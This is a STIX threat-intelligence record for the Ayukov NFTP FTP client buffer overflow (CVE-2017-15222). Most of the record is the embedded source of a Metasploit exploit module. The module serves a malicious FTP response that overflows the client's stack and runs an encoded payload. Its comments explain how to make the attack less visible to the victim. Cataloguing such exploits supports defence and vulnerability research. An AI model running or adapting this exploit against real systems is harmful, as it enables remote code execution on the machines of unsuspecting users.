{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86bdef86-e07d-4dcd-9f29-5f6cbbe139a8",
    "created": "2024-08-14T16:50:49.438406Z",
    "modified": "2024-08-14T16:50:49.43841Z",
    "name": "Ayukov NFTP FTP Client Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability against Ayukov NFTPD FTP Client 2.0 and earlier. By responding with a long string of data for the SYST request, it is possible to cause a denail-of-service condition on the FTP client, or arbitrary remote code exeuction under the context of the user if successfully exploited. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ayukov_nftp.rb",
            "external_id": "ayukov_nftp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-15222"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ayukov NFTP FTP Client Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability against Ayukov NFTPD FTP\n          Client 2.0 and earlier. By responding with a long string of data for the SYST request, it\n          is possible to cause a denail-of-service condition on the FTP client, or arbitrary remote\n          code exeuction under the context of the user if successfully exploited.\n      },\n      'Author'   =>\n        [\n          'Berk Cem Goksel',  # Original exploit author\n          'Daniel Teixeira',  # MSF module author\n          'sinn3r'            # RCA, improved module reliability and user exp\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-15222'],\n          [ 'EDB', '43025' ],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x01\\x0a\\x10\\x0d\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n    [ 'Windows XP Pro SP3 English', { 'Ret' => 0x77f31d2f } ], # GDI32.dll v5.1.2600.5512\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n      'SRVHOST' => '0.0.0.0',\n        },\n      'DisclosureDate' => '2017-10-21',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP port to listen on\", 21 ]),\n      ])\n  end\n\n  def exploit\n    srv_ip_for_client = datastore['SRVHOST']\n    if srv_ip_for_client == '0.0.0.0'\n      if datastore['LHOST']\n        srv_ip_for_client = datastore['LHOST']\n      else\n        srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')\n      end\n    end\n\n    srv_port = datastore['SRVPORT']\n\n    print_status(\"Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}\")\n    super\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n    print_status(\"#{client.peerhost} - connected\")\n\n    # Let the client log in\n    client.get_once\n\n    print_status(\"#{client.peerhost} - sending 331 OK\")\n    user = \"331 OK.\\r\\n\"\n    client.put(user)\n\n    client.get_once\n    print_status(\"#{client.peerhost} - sending 230 OK\")\n    pass = \"230 OK.\\r\\n\"\n    client.put(pass)\n\n    # It is important to use 0x20 (space) as the first chunk of the buffer, because this chunk\n    # is visible from the user's command prompt, which would make the buffer overflow attack too\n    # obvious.\n    sploit = \"\\x20\"*4116\n\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(10)\n    sploit << payload.encoded\n    sploit << Rex::Text.rand_text(15000 - 4116 - 4 - 16 - payload.encoded.length, payload_badchars)\n    sploit << \"\\r\\n\"\n\n    print_status(\"#{client.peerhost} - sending the malicious response\")\n    client.put(sploit)\n\n    client.get_once\n    pwd = \"257\\r\\n\"\n    client.put(pwd)\n    client.get_once\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-21",
    "x_mitre_platforms": [
        "win'"
    ]
}